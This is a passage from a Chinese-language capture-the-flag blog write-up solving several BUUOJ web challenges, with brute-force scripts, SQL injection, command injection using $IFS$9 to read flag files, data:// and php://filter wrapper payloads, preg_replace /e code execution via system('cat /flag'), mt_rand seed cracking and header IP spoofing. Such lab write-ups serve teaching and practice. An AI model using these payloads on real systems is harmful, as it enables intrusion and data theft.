substr_count()</h4><p>wp这里告诉我们使用点或%20，但这只在本题适用</p><p>这里的本意是寻找一个字符代替<code>_</code>，我们都知道，所有的字符都可以用ascii码表示，而url编码可以被浏览器解析</p><p>直接写脚本爆破试试</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#设置256个数</span>    code_hex <span class="token operator">=</span> hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将数字改为16进制编码</span>    code_int <span class="token operator">=</span> code_hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将code_hex的0x替换为空</span>    <span class="token comment" spellcheck="true">#print(code)  </span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>code_int<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>        code_str <span class="token operator">=</span> <span class="token string">"%0"</span> <span class="token operator">+</span> code_int    <span class="token keyword">else</span><span class="token punctuation">:</span>        code_str <span class="token operator">=</span> <span class="token string">"%"</span>  <span class="token operator">+</span> code_int        url <span class="token operator">=</span> <span class="token string">"http://b489ab93-6c1b-46f2-b07d-8a3d41746b8e.node3.buuoj.cn/?b"</span><span class="token operator">+</span>code_str<span class="token operator">+</span><span class="token string">"u"</span><span class="token operator">+</span>code_str<span class="token operator">+</span><span class="token string">"p"</span><span class="token operator">+</span>code_str<span class="token operator">+</span><span class="token string">"t=23333"</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    reslen <span class="token operator">=</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(reslen)</span>    <span class="token keyword">if</span> reslen <span class="token operator">!=</span> <span class="token number">989</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>code_str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210602175244343.png" alt="image-20210602175244343"></p><p>由此可知，%20（空格），%2e （点）都可以代替%5f (下划线)</p><p>随便选一个用</p><p><img src="image-20210602175547232.png" alt="image-20210602175547232"></p><h4 id="bypass-正则"><a href="#bypass-正则" class="headerlink" title="bypass 正则"></a>bypass 正则</h4><p><img src="image-20210602175813276.png" alt="image-20210602175813276"></p><p>要以23333开头并以23333结尾，我开始的想法是23333%00或者23333111123333，结果都不行，搞不懂</p><p>所以直接爆破试试，肯定是特殊字符中的一个，无非是开头，中间，结尾的区别，正好写了现成的脚本</p><p>开头中间都没有，结尾可以使用换行符</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#设置256个数</span>    code_hex <span class="token operator">=</span> hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将数字改为16进制编码</span>    code_int <span class="token operator">=</span> code_hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将code_hex的0x替换为空</span>    <span class="token comment" spellcheck="true">#print(code)  </span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>code_int<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>        code_str <span class="token operator">=</span> <span class="token string">"%0"</span> <span class="token operator">+</span> code_int    <span class="token keyword">else</span><span class="token punctuation">:</span>        code_str <span class="token operator">=</span> <span class="token string">"%"</span>  <span class="token operator">+</span> code_int        url <span class="token operator">=</span> <span class="token string">"http://1014064c-f83d-4790-b53a-cadac0d9cd62.node3.buuoj.cn//?b u p t=23333"</span><span class="token operator">+</span>code_str    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    reslen <span class="token operator">=</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(reslen)</span>    <span class="token keyword">if</span> reslen <span class="token operator">!=</span> <span class="token number">1014</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>code_str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210602180337110.png" alt="image-20210602180337110"></p><p>%0a是换行符，%5f是之前被过滤的下划线，所以用%0a即可</p><p><img src="image-20210602181320385.png" alt="image-20210602181320385"></p><h3 id="javascript编码和ip伪造"><a href="#javascript编码和ip伪造" class="headerlink" title="javascript编码和ip伪造"></a>javascript编码和ip伪造</h3><h4 id="javascript的特殊编码"><a href="#javascript的特殊编码" class="headerlink" title="javascript的特殊编码"></a>javascript的特殊编码</h4><p>进入secrettw.php</p><p>查看源代码</p><p><img src="image-20210602181526267.png" alt="image-20210602181526267"></p><p>注释的那行，是javascript格式的编码，直接使用浏览器自带的js编辑器即可</p><p><img src="image-20210602181643645.png" alt="image-20210602181643645"></p><p>post传入Merak，值随意</p><p><img src="image-20210602181744154.png" alt="image-20210602181744154"></p><p>得到部分源代码</p><h4 id="ip伪造的两种方式"><a href="#ip伪造的两种方式" class="headerlink" title="ip伪造的两种方式"></a>ip伪造的两种方式</h4><p>web常见的传入ip方式一般有两种，最常见的是XFF，其次是Client-ip</p><p>经测试，本题是Client-ip</p><p>Client-ip可以直接在burp修改，也可以使用修改文件头的插件，虽然常用的插件没有提供Client-ip，但问题不大</p><p><img src="image-20210602182227391.png" alt="image-20210602182227391"></p><p>手撸上去即可</p><p>XFF所有的改请求头插件都有，这里不做说明</p><h3 id="反写代码与data伪协议"><a href="#反写代码与data伪协议" class="headerlink" title="反写代码与data伪协议"></a>反写代码与data伪协议</h3><h4 id="反写代码"><a href="#反写代码" class="headerlink" title="反写代码"></a>反写代码</h4><p>这里本题写了一个ascii移位，将传上去的file变成了编码，需要我们反写这个移位规则</p><p><img src="image-20210602202139108.png" alt="image-20210602202139108"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token string">"ZmpdYSZmXGI="</span><span class="token punctuation">;</span>    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span> <span class="token punctuation">(</span> <span class="token function">ord</span> <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">echo</span> <span class="token variable">$re</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$rb</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rb</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210602202337747.png" alt="image-20210602202337747"></p><p>成功</p><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><p><img src="image-20210602202450986.png" alt="image-20210602202450986"></p><p>这里题目用file_get_contents()函数包裹了GET传入的2333,然后才进行比较</p><p>file_get_contents()函数用于打开文件，显然无法打开传入的字符串</p><p>构造data://协议，将字符串转为字节流让file_get_contents()函数可以读取</p><pre><code>data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</code></pre><p>text/plain是纯文本格式文件，text/html是html类型文件，所以这里使用text/plain</p><p>上传，查看源码拿到flag：</p><p><img src="image-20210602213620556.png" alt="image-20210602213620556"></p><h4 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h4><pre><code>/?b u p t=23333%0a</code></pre><pre><code>/secrettw.phppost: Merak=1header: Client-ip: 127.0.0.1</code></pre><pre><code>/secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</code></pre><h3 id="flag-16"><a href="#flag-16" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{a8b3ea3d-2219-4ea4-ba29-bb135daea8c6}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><h3 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h3><p>题目提示代码审计，直接访问<a href="http://www.zip得到部分源码/">www.zip得到部分源码</a></p><p><img src="image-20210604101253753.png" alt="image-20210604101253753"></p><p>post传参u埃尔那么，password和private_key</p><p>其中username已知，password可以直接sql注入，parvate_key未知</p><p><img src="image-20210604101455429.png" alt="image-20210604101455429"></p><p>这里使用的是seed伪随机数漏洞，不过我没有成功复现</p><p>简单说，php中用于构造随机数的mt_rand()函数并不是一个真正意义上的随机数</p><p>mt_rand函数是通过撒播随机数种子来生成随机数的，并且mt_rand生成随机数只撒播一次种子，之后的随机数都使用同一个种子生成。如果知道了随机数种子，就可以将私钥得出。</p><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</p><p>这时如果我们知道这个种子，就可以确定的得到这个随机密钥</p><p>使用php_mt_seed工具对已知共钥进行爆破即可</p><p>先用脚本改写格式</p><pre class="line-numbers language-python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>str2<span class="token operator">=</span><span class="token string">'KVQP0LdJKRaV3n9D'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>length <span class="token operator">=</span> len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行php_mt_seed，得到结果</p><p>1775196155</p><p>然后带入题中得到私钥</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">1775196155</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//公钥</span><span class="token keyword">function</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$public_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//私钥</span><span class="token keyword">function</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$private_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有个奇怪的问题，我运行得到的密钥是3NxjlpuxSI5y，并不是真实的密钥</p><p>而wp告诉我密钥是XuNhoueCDCGc</p><p>可能是版本问题吧，我没有成功解决这个问题，直接用wp说的密钥</p><pre><code>http://e9e64b27-0b84-4234-8d42-47116db13051.node3.buuoj.cn/login.phppost:Private_key=XuNhoueCDCGc&amp;login=%E7%99%BB%E5%BD%95&amp;password=%27+or+1%3D1--+&amp;username=crispr</code></pre><p><img src="image-20210604160843748.png" alt="image-20210604160843748"></p><h3 id="flag-17"><a href="#flag-17" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{e799b498-3d87-4a0b-a120-07efc40d3eb5}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p>这里用了ping命令，直接执行</p><p>首先，管道符被绕过，所以使用<code>;</code></p><pre><code>?ip=baidu.com;ls</code></pre><p><img src="image-20210604215151644.png" alt="image-20210604215151644"></p><p>看一眼index.php，确定过滤了什么</p><p>空格被过滤，使用$IFS$9替代</p><pre><code>?ip=baidu.com;cat$IFS$9index.php</code></pre><p><img src="image-20210604215535835.png" alt="image-20210604215535835"></p><p>过滤很严，而且不允许任何形式的flag存在，<code>*f*l*a*g*</code>,不过它是按顺序检测到，所以改一下顺序</p><pre><code>?ip=baudu.com;a=ag;b=fl;cat$IFS$9$b$a.php</code></pre><p><img src="image-20210605092255261.png" alt="image-20210605092255261"></p><h3 id="flag-18"><a href="#flag-18" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{8c2bf6b8-0735-49c6-8546-a3f63af67fb8}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="data-与php"><a href="#data-与php" class="headerlink" title="data://与php://"></a>data://与php://</h3><p><img src="image-20210605100418141.png" alt="image-20210605100418141"></p><p>要求$_GET传参text和file</p><p>并且file_get_contents($text)等于I have a dream</p><p>其次file中不能存在flag,但同时提醒了next.php文件</p><p>payload,伪协议我在前面有说到，不做赘述</p><pre><code>?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php</code></pre><p>这样我们就得到了next.php的源代码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        <span class="token string">'/('</span> <span class="token punctuation">.</span> <span class="token variable">$re</span> <span class="token punctuation">.</span> <span class="token string">')/ei'</span><span class="token punctuation">,</span>        <span class="token string">'strtolower("\\1")'</span><span class="token punctuation">,</span>        <span class="token variable">$str</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="正则匹配的命令执行"><a href="#正则匹配的命令执行" class="headerlink" title="正则匹配的命令执行"></a>正则匹配的命令执行</h3><p>看源码，有个命令执行和正则匹配，但程序将我们的输入通过foreach()遍历输出，我们无法直接执行eval</p><p>但preg_replace()中有个e,这里可以执行命令</p><p>注意：php7已将选项e废弃</p><p>原理看这篇文章，说的比我清楚</p><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a></p><p>直接贴payload</p><pre><code>next.php?\S*=$&#123;phpinfo()&#125;</code></pre><p>这个无法直接得到flag，但可以让我们调用getFlag()</p><p>payload</p><pre><code>next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><p><img src="image-20210605105713156.png" alt="image-20210605105713156"></p><h3 id="flag-19"><a href="#flag-19" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{a0bef091-1902-4c87-92dd-8d6bd592b8de}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="md5注入"><a href="#md5注入" class="headerlink" title="md5注入"></a>md5注入</h3><p>开始，一个输入框，除此之外没有任何的信息，找了好久才抓包时看到考点</p><p><img src="image-20210605164929682.png" alt="image-20210605164929682"></p><p>也是我瞎</p><p>猜测这里可能是将我们的输入改成了md5储存，这也是大名鼎鼎的彩虹库的原理</p><p>这里转成了16进制，只要在转化后字符符合注入要求即可了，百度看看</p><p><img src="image-20210605165408876.png" alt="image-20210605165408876"></p><p>这里我用了第一个：<strong>ffifdyop</strong></p><p><img src="image-20210605165455524.png" alt="image-20210605165455524"></p><h3 id="md5碰撞-1"><a href="#md5碰撞-1" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>这个知识点我之前说了</p><p>具体看之前写的**[MRCTF2020]Ez_bypass<strong>，或者我博客里的</strong>php笔记**</p><p>这里只说一下做法</p><p>找两个MD5加密后字符串为0e开头的即可passby</p><p>payload:</p><pre><code>levels91.php?a=s878926199a&amp;b=s155964671a</code></pre><p><img src="image-20210605170126286.png" alt="image-20210605170126286"></p><p>成功，又是md5</p><h3 id="md5-数组绕过"><a href="#md5-数组绕过" class="headerlink" title="md5,数组绕过"></a>md5,数组绕过</h3><p>同样，之前说过了</p><p>payload:</p><pre><code>post:param1[]=aaa&amp;param2[]=2</code></pre><p>成功得到flag</p><p><img src="image-20210605170300900.png" alt="image-20210605170300900"></p><h3 id="flag-20"><a href="#flag-20" class="headerlink" title="flag:"></a>flag:</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{eb6ea706-9ce0-427f-9336-385a9de3fc36}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>本题原意是寻找框架的漏洞</p><p>不过我没经验，手测了</p><p>点开flag，题目给了我的ip地址，这表明题目获取了我的ip，所以伪造一下ip</p><p>成功伪造</p><p><img src="image-20210605180009154.png" alt="image-20210605180009154"></p><p>我这里随意的输入了命名，发现有报错</p><p><img src="image-20210605192846540.png" alt="image-20210605192846540"></p><p>代码是我百度了一串乱输的</p><p>所以，这里存在命令执行</p><p>测试，可以用花括号执行命令</p><p><img src="image-20210605193114296.png" alt="image-20210605193114296"></p><p>得到flag</p><p><img src="image-20210605193201236.png" alt="image-20210605193201236"></p><p>正确做法：<a href="https://blog.csdn.net/qq_41628669/article/details/106133129">https://blog.csdn.net/qq_41628669/article/details/106133129</a></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwNTEyMTcyNDM1OTgxLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3dhdGVybWFyayx0eXBlX1ptRnVaM3BvWlc1bmFHVnBkR2ssc2hhZG93XzEwLHRleHRfYUhSMGNITTZMeTlpYkc5bkxtTnpaRzR1Ym1WMEwzRnhYelF4TmpJNE5qWTUsc2l6ZV8xNixjb2xvcl9GRkZGRkYsdF83MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><p>通过模板分析，确定框架</p><p>然后做题</p><h3 id="flag-21"><a href="#flag-21" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{f5095f02-89ec-4a75-849a-2c560a0a631e}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><h3 id="git-源码泄露"><a href="#git-源码泄露" class="headerlink" title=".git 源码泄露"></a>.git 源码泄露</h3><p>目录扫描发现存在.git文件</p><p>用GitHack将源码dump下来</p><p>分析</p><p><img src="image-20210607100857805.png" alt="image-20210607100857805"></p><p><img src="image-20210607100904055.png" alt="image-20210607100904055"></p><h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>我们传入?yds=flag</p><p>得到flag</p><p><img src="image-20210607194453267.png" alt="image-20210607194453267"></p><ul><li><p>分析：</p><p>  <img src="image-20210607195010030.png" alt="image-20210607195010030"></p><p>  漏洞在这两行代码</p><p>  如果不存在<code>$_GET</code>或<code>$_POST</code>其中之一，则输出$yds</p><p>  而上面的数组遍历将传入的参数名给了x，值给了y</p><p>  但我们传入yds=flag时</p><p>  在这个位置如此执行</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  于是flag便在下面输出</p><h3 id="flag-22"><a href="#flag-22" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{2ff487ff-e094-4dc5-835c-107af2c381e6}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="第三章-web进阶-SSTI"><a href="#第三章-web进阶-SSTI" class="headerlink" title="[第三章 web进阶]SSTI"></a>[第三章 web进阶]SSTI</h2><h3 id="jinjaSSTI"><a 